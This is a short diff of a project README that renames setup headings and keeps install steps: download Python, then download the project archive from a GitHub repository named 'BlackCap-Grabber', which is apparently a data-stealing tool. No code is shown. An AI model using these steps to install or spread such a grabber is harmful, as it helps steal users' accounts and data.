@@ -17,11 +17,11 @@
 
 - [🌐・Website](Soon)
 - [🌌・Discord](https://discord.gg/XyV8RZDjQU)
-- [🎉・Setting up Stormy](#setup)
+- [🎉・Setting](#setup)
 - [📝・Changelog](#changelog)
 - [💼・Term](#terms)
 
-## <a id="setup"></a> 📁 〢 Setting up BlackCap
+## <a id="setup"></a> 📁 〢 Setting
 
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
 2. Install [Stormy](https://github.com/KSCHdsc/BlackCap-Grabber/archive/refs/heads/main.zip)
